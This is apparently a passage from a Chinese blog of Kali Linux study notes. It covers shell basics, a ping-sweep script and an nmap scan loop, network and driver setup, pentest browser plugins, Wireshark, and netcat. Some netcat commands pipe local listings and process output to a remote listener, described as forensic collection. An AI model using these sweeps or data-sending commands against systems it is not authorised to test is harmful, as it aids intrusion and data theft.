<li>updatedb（更新whereis的数据库）</li>
</ul>
</li>
<li>echo（在当前终端窗口显示信息）</li>
<li>vi（文本编辑器）<ul>
<li>vi 目标文件（编辑目标文件）</li>
<li>：set number（显示行号）</li>
<li>：wq（写入退出）</li>
<li>i（插入模式）</li>
<li>esc（退出模式）</li>
<li>dd（删除一整行）</li>
<li>o（插入一行）</li>
<li>Y（复制）,T（黏贴）</li>
</ul>
</li>
</ul>
<h4 id="3-管道"><a href="#3-管道" class="headerlink" title="3. 管道"></a>3. 管道</h4><ul>
<li>cat /varc/log/messages | grep ssl</li>
<li>cd aaa &amp; ls （前后两个命令依次执行）</li>
<li>cd aaa &amp;&amp; ls（如果前面执行成功，才执行后面的命令）</li>
<li>cd aaa || ls（如果前面执行不成功，才去执行后面的命令）</li>
</ul>
<h4 id="4-shell脚本"><a href="#4-shell脚本" class="headerlink" title="4. shell脚本"></a>4. shell脚本</h4><ul>
<li>1.sh<ul>
<li>chmod =x 1.sh</li>
<li>./1.sh</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo -n &apos;IP:&apos;&apos;  //-n光标不换行</span><br><span class="line">read ip</span><br><span class="line">echo &apos;your ip is:&apos; $ip</span><br></pre></td></tr></table></figure>

<ul>
<li>99.sh<ul>
<li>chmod =x 99.sh</li>
<li>./99.sh</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for n in `seq 9`  //9的序列</span><br><span class="line">do</span><br><span class="line">   for m in `seq $n`</span><br><span class="line">   do</span><br><span class="line">   echo -n &quot;$m*$n=&quot; `expr $m \ * $n`&quot; &quot;</span><br><span class="line">   done</span><br><span class="line"> echo</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ul>
<li>ping.sh(活着的ip地址)<ul>
<li>chmod -x ping.sh</li>
<li>./ping.sh</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for n in `seq 254`</span><br><span class="line">do</span><br><span class="line">   ping 192.168.100.$n -c 1 | grep ttl | awk &apos;&#123;print $4&#125;&apos;| awk -F: &apos;&#123;print $1&#125;&apos;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ul>
<li>s1.sh(需要一个扫描预文件ip1)▲还未实现<ul>
<li>chmod -x s1.sh</li>
<li>./s1.sh</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">A=&apos;cat ip1&apos;</span><br><span class="line">for B in $A</span><br><span class="line">do</span><br><span class="line">   n=&apos;echo $B | wc -L&apos;</span><br><span class="line">   if [ $n -gt 6 ] ; then</span><br><span class="line">      ip=$B</span><br><span class="line">   else</span><br><span class="line">       port=$B</span><br><span class="line">       namp -p$port -sV $ip | grep -v Starting | grep -v Host | grep -v PORT | grep -v Service | grep -v done &gt;&gt; r1</span><br><span class="line">       fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="5-网路配置-1"><a href="#5-网路配置-1" class="headerlink" title="5. 网路配置-1"></a>5. 网路配置-1</h4><ul>
<li>临时IP地址（重启后不生效,在临时设置有时间限制，大约30s连接时间）<ul>
<li><strong><code>🔺命令：dhclient eth0</code></strong>（自动获取IP地址）</li>
<li><strong><code>🔺命令：ifconfig eth0 192.168.100.x/24</code></strong>（指定一个IP地址）</li>
<li><strong><code>🔺命令：route add default gw 192.168.100.1</code></strong>（添加默认网关，缺省网关）</li>
<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看IP网关信息）</li>
<li><strong><code>🔺命令：route add -net 172.16.0.0/24（vlan的ip地址） gw 192.168.100.x eth0</code></strong>（vlan 配置）</li>
<li><strong><code>🔺命令：echo nameserver 8.8.8.8&gt;/etc/resolv.conf</code></strong>（vi /etc/resolv.conf修改域名服务器）</li>
</ul>
</li>
<li>固定IP地址（重启后生效）<ul>
<li>cat /etc/network/interfaces</li>
<li>auto eth0</li>
<li>iface eth0 inet static</li>
<li>address 192.168.100.x（本机IP地址）</li>
<li>netmask 255.255.255.0（子网掩码）</li>
<li>network 192.168.100.0（网络地址，可不配置）</li>
<li>broadcast 192.168.100.255（广播地址，可不配置）</li>
<li>gateway 192.168.100.x（网关地址）</li>
<li>dns-nameservers 192.168.100.x（可写多个）</li>
<li>uproute add-net 172.16.2.0/24 gw 192.168.100.x eth1 （添加内部地址，静态路由）</li>
<li>down route del-net 172.168.2.x/24（电脑关闭的时候，关闭静态理由）</li>
</ul>
</li>
</ul>
<h4 id="6-更新升级"><a href="#6-更新升级" class="headerlink" title="6. 更新升级"></a>6. 更新升级</h4><ul>
<li><strong><code>🔺命令：apt-get update --fix-missing</code></strong>（不是更新工具包，是更新软件包的网络索引，通过后面的参数可以把有问题的索引删除）<ul>
<li>科技大学更新源（vi /etc/apt/source.list）▲源的地址无法找到</li>
<li>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib</li>
<li>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib</li>
<li>deb <a href="http://mirrors.ustc.edu.cn/kali-security" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali-security</a> kali/updates main contrib non-free</li>
</ul>
</li>
<li><strong><code>🔺命令：apt-get upgrade</code></strong>(更新实际软件包文件)</li>
<li><strong><code>🔺命令：apt-get dist-upgrade</code></strong>(大版本的更新)</li>
<li>重复执行</li>
</ul>
<h4 id="7-安装软件包"><a href="#7-安装软件包" class="headerlink" title="7. 安装软件包"></a>7. 安装软件包</h4><ul>
<li>库<ul>
<li>Apt-get命令（也可通过–fix-missing）</li>
</ul>
</li>
<li>安装适合自己的工具软件<ul>
<li>smplayer（媒体播放器）</li>
<li>ibus ibus-pinyin（中文输入法）</li>
<li>flashplugin-nonfree（浏览器flash插件）▲2019.11.22浏览器自带，2020年底将淘汰</li>
<li>gdebi（方便使用图形化界面安装deb）</li>
<li>amule、qbittorrent（磁力下载）</li>
<li>geany（程序开发环境）</li>
<li>stardict（英文字典，翻译软件）</li>
<li>meld（用来文件差异比较的软件）</li>
<li>ttf-wqy-microhei（字体）</li>
<li>kchmviewer（打开chm文件，微软帮助文件）</li>
<li>freemind（头脑风暴软件，思维导图）</li>
<li>netspeed（网络连接速度监视小工具）</li>
<li>mtr（路由追踪，图形化界面，同traceroute，<strong>🔺命令：mtr ip地址</strong>）</li>
<li>file-zilla、file-zilla-common(ftp客户端)</li>
<li>chromium（谷歌浏览器）</li>
<li>monodevelop、mono-gmcs-y（.net开发环境）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>库中不存在的工具列表（2019.11.22）
flashplugin-nonfree
stardict
amule
monodevelop
mono-gmcs-y</code></pre></blockquote>
<h4 id="8-浏览器插件"><a href="#8-浏览器插件" class="headerlink" title="8. 浏览器插件"></a>8. 浏览器插件</h4><ul>
<li>firefox浏览器插件<ul>
<li>AutoProxy（翻墙指定代理）▲2019.12.29 替换为FoxyProxy</li>
<li>Cookie Importer（导入Cookie）▲2019.11.22替换为Cookie Import Export</li>
<li>Cookies Manager（管理Cookie信息）</li>
<li>Download YouTube Videos as MP4（下载MP4视频）▲2019.11.22替换为YouTube Download plus</li>
<li>Firebug（基于Web调试）▲2019.11.22替换为Firebug Persona</li>
<li>Flagfox（网页国家服务器）</li>
<li>FlashGot（允许视频文件下载）</li>
<li>HackBar（Web渗透测试重要工具）</li>
<li>hashr（计算哈希值）▲2019.11.22替换为PwdHash</li>
<li>Live HTTP headers（对HTTP header进行拦截，查看）</li>
<li>SQL Inject Me（SQL注入攻击）▲2019.11.22未找到</li>
<li>Tamper Data（浏览器向服务器的HTTP进行查看，修改数据包头）▲2019.11.22未找到</li>
<li>User Agent Switcher（修改特征字符串，firefox→IE）</li>
<li>XSS Me（跨站脚本攻击）▲2019.11.22替换为EasyXSS</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>浏览器（alt键）→Tools→Add-ons
XSS-Me（https://addons.mozilla.org/en-US/firefox/addon/xss-me）
SQL-Inject-Me(https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss)</code></pre></blockquote>
<h4 id="9-安装JAVA-1"><a href="#9-安装JAVA-1" class="headerlink" title="9. 安装JAVA-1"></a>9. 安装JAVA-1</h4><ul>
<li>下载(<a href="https://www.oracle.com/technetwork/java/javase/downloads）" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/downloads）</a></li>
<li>解压缩包（需要下载jdk和jre两者合并的包，2019.11.22用的是jdk-8u231包）<ul>
<li><strong><code>🔺命令：tar -xzvf java路径</code></strong></li>
<li><strong><code>🔺命令：mv jdk版本 /opt</code></strong></li>
<li><strong><code>🔺命令：cd /opt/jdk版本（路径）</code></strong></li>
</ul>
</li>
<li>安装注册<ul>
<li><strong><code>🔺命令：update-alternatives --install /usr/bin/java java /opt/jdk版本/bin/java 1</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --install /usr/bin/javac javac /opt/jdk版本/bin/javac 1</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk路径/jre/lib/amd64/libnpjp2.so 1</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-安装JAVA-2"><a href="#10-安装JAVA-2" class="headerlink" title="10. 安装JAVA-2"></a>10. 安装JAVA-2</h4><ul>
<li>默认设置<ul>
<li><strong><code>🔺命令：update-alternatives --set java /opt/jdk版本/bin/java</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --set javac /opt/jdk版本/bin/javac</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --set mozilla-javaplugin.so /opt/jdk版本/jre/lib/amd64/libnpjp2.so</code></strong></li>
</ul>
</li>
<li>验证<ul>
<li><strong><code>🔺命令：java -version</code></strong>（主机验证java安装）</li>
<li><a href="http://www.java.com/en/download/installed.jsp" target="_blank" rel="noopener">http://www.java.com/en/download/installed.jsp</a> (网页验证java安装，firefox Version 52之后不提供plugins的验证)</li>
</ul>
</li>
</ul>
<h4 id="11-安装显卡驱动"><a href="#11-安装显卡驱动" class="headerlink" title="11. 安装显卡驱动"></a>11. 安装显卡驱动</h4><ul>
<li>GPU的用途<ul>
<li>Nvidia</li>
<li>Ati</li>
</ul>
</li>
<li>Nvidia显卡驱动安装<ul>
<li><strong><code>🔺命令：apt-get update</code></strong></li>
<li><strong><code>🔺命令：apt-get dist-upgrade</code></strong></li>
<li><strong><code>🔺命令：apt-get install -y（直接安装） linux-headers-$(uname -r)</code></strong></li>
<li><strong><code>🔺命令：apt-get install nvidia-kernel-dkms(Nvidia架构库)</code></strong></li>
<li><strong><code>🔺命令：sed &#39;s/quiet/quiet nouveau.modeset=0/g&#39; -i /etc/default/grub</code></strong></li>
<li><strong><code>🔺命令：update-grub</code></strong></li>
<li><strong><code>🔺命令：reboot</code></strong></li>
</ul>
</li>
<li>验证<ul>
<li><strong><code>🔺命令：glxinfo | grep -i &quot;direct rendering&quot;</code></strong>(需apt-get install mesa-utils，不然会报glxinfo commond not found)<ul>
<li>direct rendering:Yes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="12-无线网卡补丁"><a href="#12-无线网卡补丁" class="headerlink" title="12. 无线网卡补丁"></a>12. 无线网卡补丁</h4><ul>
<li>最新版内核已经集成无线驱动补丁（版本1.09之前，包括1.09）</li>
<li>如果你在使用老版本内核（<strong><code>🔺命令：uname -a</code></strong>查看版本）▲未验证<ul>
<li><strong><code>🔺命令：cd /usr/src/</code></strong></li>
<li><strong><code>🔺命令：wget https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v kali的版本/backports-kali的版本-1.tar.bz2</code></strong></li>
<li><strong><code>🔺命令：tar xvf backports-kali的版本-1.tar.gz</code></strong></li>
<li><strong><code>🔺命令：cd backports-kali的版本-1</code></strong></li>
<li><strong><code>🔺命令：apt-get install patch</code></strong></li>
<li><strong><code>🔺命令：wget http://patches.aircrack-ng.org/mac80211.compat08082009.wt_frag+ack_v1.patch</code></strong></li>
<li><strong><code>🔺命令：patch -p1 &lt; mac80211.compat08082009.wt_frag+ack_v1.patch</code></strong>`**</li>
<li><strong><code>🔺命令：apt-get install libncurses5-dev</code></strong>(安装开发库文件)</li>
<li><strong><code>🔺命令：airmon-ng</code></strong>(查看驱动)</li>
<li><strong><code>🔺命令：make defconfig-ath9k</code></strong>（替换芯片驱动）</li>
<li><strong><code>🔺命令：make &amp;&amp; make install</code></strong></li>
</ul>
</li>
</ul>
<h4 id="13-并发线程限制"><a href="#13-并发线程限制" class="headerlink" title="13. 并发线程限制"></a>13. 并发线程限制</h4><ul>
<li>ulimit用于限制当前shell内进程的资源使用</li>
<li>查看默认值<ul>
<li><strong><code>🔺命令：ulimit -a</code></strong></li>
</ul>
</li>
<li>全局配置文件：/etc/security/limits<ul>
<li><domain><type><item><value></li>
</ul>
</li>
<li>用途距离<ul>
<li>限制堆栈大小：<strong><code>🔺命令：ulimit -s 100（文件大小）</code></strong></li>
<li>限制shell内存使用：<strong><code>🔺命令：ulimit -m（最大内存大小） 5000 -v（虚拟内存大小） 5000</code></strong></li>
<li>限制并发次数，openfile ：<strong><code>🔺命令：ulimit -n 900000（次数）</code></strong></li>
</ul>
</li>
<li>没有直接对socket数量的限制参数<ul>
<li>Linux系统中一切都是文件，运行中的文件叫做进程</li>
<li><strong><code>🔺命令：vi /.bashrc→ulimit -n 900000</code></strong>（持久化ulimit）</li>
</ul>
</li>
</ul>
<h4 id="14-电源优化（kali耗电非常大）"><a href="#14-电源优化（kali耗电非常大）" class="headerlink" title="14. 电源优化（kali耗电非常大）"></a>14. 电源优化（kali耗电非常大）</h4><ul>
<li>渗透测试系统耗电较大</li>
<li>延长电池寿命<ul>
<li>无操作挂起，关闭显示器(系统设置中的电源，选择操作)</li>
<li>降低显示器亮度（系统设置中的电源，降低亮度）</li>
<li>不使用时关闭无线网卡</li>
<li>开启硬盘省电选项<ul>
<li><strong><code>🔺命令：hdparm -i /dev/sdx if AdvancedPM=yes then hdparm -B 1 -S 12 /dev/sdx</code></strong></li>
</ul>
</li>
<li>启动笔记本模式(<strong><code>🔺命令：chmod a+x 脚本</code></strong>)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">currentMode=$(cat /proc/sys/vm/laptop_mode)</span><br><span class="line">if [ $currentMode -eq 0 ]</span><br><span class="line">then</span><br><span class="line">echo &quot;5&quot;&gt;/proc/sys/vm/laptop_mode</span><br><span class="line">echo &quot;Laptop Mode Enabled&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;0&quot;&gt;/proc/sys/vm/laptop_mode</span><br><span class="line">echo &quot;Laptop Mode Disabled&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h4 id="15-服务开关"><a href="#15-服务开关" class="headerlink" title="15. 服务开关"></a>15. 服务开关</h4><ul>
<li>Kali Linux默认未启动所有网络服务</li>
<li><strong><code>🔺命令：update-rc.d ssh defaults</code></strong>（持久化启动服务）<ul>
<li><strong><code>🔺命令：update-rc.d ssh start 20 2 3 4 5 .stop 20 0 1 6.</code></strong></li>
<li><strong><code>🔺命令：update-rc.d A defaults 80（启动优先级） 20（关闭优先级）</code></strong></li>
<li><strong><code>🔺命令：update-rc.d B defaults 90（启动优先级） 10（关闭优先级）</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：/etc/init.d/ssh start</code></strong>(临时开启服务)</li>
<li>重启操作系统 <strong><code>🔺命令：init 6</code></strong></li>
<li>关闭操作系统 <strong><code>🔺命令：init 0</code></strong></li>
</ul>
<blockquote>
<pre><code>运行级别：
0：关机
1：单用户模式
2.3.4.5：多用户模式
6：重启</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83)%EF%BC%9AWireshark/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83)%EF%BC%9AWireshark/" itemprop="url">Kali Linux笔记(二)：Wireshark</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  553 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-WIRESHARK"><a href="#1-WIRESHARK" class="headerlink" title="1. WIRESHARK"></a>1. WIRESHARK</h4><ul>
<li>抓包嗅探协议分析</li>
<li>安全专家必备的技能</li>
<li>抓包引擎<ul>
<li>Libpcap9–Linux</li>
<li>Winpcap10–Windows</li>
</ul>
</li>
<li>解码能力（衡量抓包软件能力强弱）</li>
</ul>
<h4 id="2-WIRESHARK-基本使用"><a href="#2-WIRESHARK-基本使用" class="headerlink" title="2. WIRESHARK-基本使用"></a>2. WIRESHARK-基本使用</h4><ul>
<li>启动</li>
<li>选择抓包网卡</li>
<li>混杂模式</li>
<li>实时抓包</li>
<li>保存和分析捕获文件</li>
<li>首选项（布局调整：Edit → Preferences）</li>
</ul>
<blockquote>
<pre><code>混杂模式会抓以太网内所有的包，非混杂只抓取到达自己网卡的包（Enable promiscuous mode on all interfaces）
抓包筛选器（Capture Filter），可自己设置（如：host ip地址）</code></pre></blockquote>
<h4 id="3-WIRESHARK-筛选器"><a href="#3-WIRESHARK-筛选器" class="headerlink" title="3. WIRESHARK-筛选器"></a>3. WIRESHARK-筛选器</h4><ul>
<li>过滤掉干扰的数据包</li>
<li>抓包筛选器</li>
<li>显示筛选器（右键 → Apply as Filter，可对任何数据）</li>
</ul>
<blockquote>
<pre><code>Network → Capture Filters → Capture Engine → Dispaly Filters</code></pre></blockquote>
<h4 id="4-数据包的分层结构"><a href="#4-数据包的分层结构" class="headerlink" title="4.  数据包的分层结构"></a>4.  数据包的分层结构</h4><ul>
<li>ARP</li>
<li>ICMP</li>
<li>TCP-三次握手</li>
<li>UDP</li>
<li>DNS</li>
<li>HTTP</li>
<li>FTP</li>
</ul>
<blockquote>
<pre><code>对于非官方端口解析：选中 → 右键 → Decode As → HTTP</code></pre></blockquote>
<h4 id="5-WIRESHARK-TCP"><a href="#5-WIRESHARK-TCP" class="headerlink" title="5. WIRESHARK-TCP"></a>5. WIRESHARK-TCP</h4><ul>
<li>数据流<ul>
<li>http（明文传输）</li>
<li>Smtp（明文传输）</li>
<li>Pop3（明文传输）</li>
<li>Ssl（密文传输，公钥证书是以明文传输的形式）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>完整的数据响应过程：选中 → 右键 → follow TCP/UDP stream</code></pre></blockquote>
<h4 id="6-WIRESHARK-信息统计（Statistics、Analyze）"><a href="#6-WIRESHARK-信息统计（Statistics、Analyze）" class="headerlink" title="6. WIRESHARK-信息统计（Statistics、Analyze）"></a>6. WIRESHARK-信息统计（Statistics、Analyze）</h4><ul>
<li>节点数–Summary摘要信息、Endpoints包的总数统计 ▲2019.11.26Summary改版为Capture File Properties</li>
<li>协议分析–Protocol Hierarchy当前数据包的协议类型（DNS占比不大）</li>
<li>包大小分布–Packet Lengths包的长度（小包占比大说明网络性能不好）</li>
<li>会话连接–Conversations机器间的会话（若少量会话占用程序，说明僵尸网络在发包）</li>
<li>解码方式–Decode AS解析成自定义协议</li>
<li>专家系统–Expert info软件自带分析 ▲2019.11.26Expert info改版为Expert information</li>
</ul>
<h4 id="7-WIRESHARK-实践"><a href="#7-WIRESHARK-实践" class="headerlink" title="7. WIRESHARK-实践"></a>7. WIRESHARK-实践</h4><ul>
<li><p>抓包对比nc、ncat加密与不加密的流量</p>
<ul>
<li>nc传输（明文传输）</li>
</ul>
<ol>
<li>ARP</li>
<li>TCP三次握手</li>
<li>反向ARP</li>
<li>开始TCP传输数据</li>
</ol>
</li>
</ul>
<blockquote>
<pre><code>follow TCP stream为明文传输</code></pre></blockquote>
<ul>
<li><p>抓包对比nc、ncat加密与不加密的流量  </p>
<ul>
<li>ncat传输（密文传输）</li>
</ul>
<ol>
<li>ARP</li>
<li>TCP三次握手</li>
<li>反向ARP</li>
<li>开始TCP传输数据</li>
</ol>
</li>
</ul>
<blockquote>
<pre><code>follow TCP stream为密文传输，一些Ncat特征为明文传输</code></pre></blockquote>
<ul>
<li>企业抓包部署方案（镜像端口 → 全流量，多块网卡捆绑，被动式扫描）<ul>
<li>Sniffer</li>
<li>Cace/riverbed（建立索引，易于大文件分析）</li>
<li>Cascad pilot</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD)%EF%BC%9ANETCAT/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD)%EF%BC%9ANETCAT/" itemprop="url">Kali Linux笔记(六)：NETCAT</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-常使用工具"><a href="#1-常使用工具" class="headerlink" title="1. 常使用工具"></a>1. 常使用工具</h4><ul>
<li>经常使用且功能强大</li>
<li>安全从业者必不可少的帮手</li>
<li>Nc/ncat</li>
<li>Wireshark</li>
<li>Tcp dump</li>
</ul>
<h4 id="2-NETCAT-NC"><a href="#2-NETCAT-NC" class="headerlink" title="2. NETCAT-NC"></a>2. NETCAT-NC</h4><ul>
<li>网络工具中的瑞士军刀-小身材，大智慧</li>
<li>侦听模式/传输模式</li>
<li>telnet/获取banner信息（比telnet稳定）</li>
<li>传输文本信息</li>
<li>传输文件/目录（ftp服务器）</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<h4 id="3-NC-TELNET-BANNER"><a href="#3-NC-TELNET-BANNER" class="headerlink" title="3. NC-TELNET/BANNER"></a>3. NC-TELNET/BANNER</h4><blockquote>
<pre><code>nc-nv 1.1.1.1 110
nc-nv 1.1.1.1 25
nc-nv 1.1.1.1 80</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：ping smtp.163.com、pop3.163.com</code></strong>（测试网络）</li>
<li><strong><code>🔺命令：netstat -rn</code></strong>（查看网络连接）</li>
<li>nc -vn（域名相关详细信息，建议将域名解析出来）</li>
<li><strong><code>🔺命令：nc -nv ip地址 110</code></strong>（pop3服务器）</li>
<li><strong><code>🔺命令：USER</code></strong> （base64 邮箱地址）</li>
<li><strong><code>🔺命令：nc -nv ip地址 25</code></strong>（smtp服务器）</li>
<li><strong><code>🔺命令：ehlo 名字</code></strong>（可看到命令行选项）</li>
<li><strong><code>🔺命令：nc -nv ip地址 80</code></strong>（http服务器，metasploitable）</li>
<li><strong><code>🔺命令：get head/</code></strong>（两者不可重复使用，一样的效果）</li>
</ul>
<blockquote>
<pre><code>Kali base64命令的使用
1.启动终端
2.输入base64
3.输入需要编码的字符串
4.CTRL+D，结束输入，在屏幕上会显示出结果</code></pre></blockquote>
<h4 id="4-NC-传输文本信息"><a href="#4-NC-传输文本信息" class="headerlink" title="4. NC-传输文本信息"></a>4. NC-传输文本信息</h4><ul>
<li>A： <strong><code>🔺命令：nc -l -p 端口号</code></strong>（开放一个端口，作为服务端）</li>
<li>B： <strong><code>🔺命令：nc -nv IP地址 端口号</code></strong>（连接对方端口，作为客户端）</li>
<li>远程电子取证收集<ul>
<li><strong><code>🔺命令：ls -l | nc -nv IP地址 端口号</code></strong>（服务端）</li>
<li><strong><code>🔺命令：nc -l -p 333 &gt; ps.txt</code></strong>（服务端） <strong><code>🔺命令：ps aux | nc -nv IP地址 端口 -q（有结束标志EOF） 1</code></strong>（客户端）</li>
</ul>
</li>
</ul>
<h4 id="5-NC-传输文件-目录"><a href="#5-NC-传输文件-目录" class="headerlink" title="5. NC-传输文件/目录"></a>5. NC-传输文件/目录</h4><ul>
<li>传输文件<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号&gt;x.mp4</code></strong>（接收端）</li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号&lt; x.mp4 -q 1</code></strong>（发送端）</li>
<li>or</li>
<li>A:<strong><code>🔺命令：nc -lp 端口号 &lt; x.mp4 -q 1</code></strong>（发送端）</li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 &gt;x.mp4</code></strong>（接收端）</li>
</ul>
</li>
<li>传输目录 ▲2019.11.25实验未成功<ul>
<li>A:<strong><code>🔺命令：tar -cvf -文件名/ | nc -lp 端口号 -q 1</code></strong>（发送端）</li>
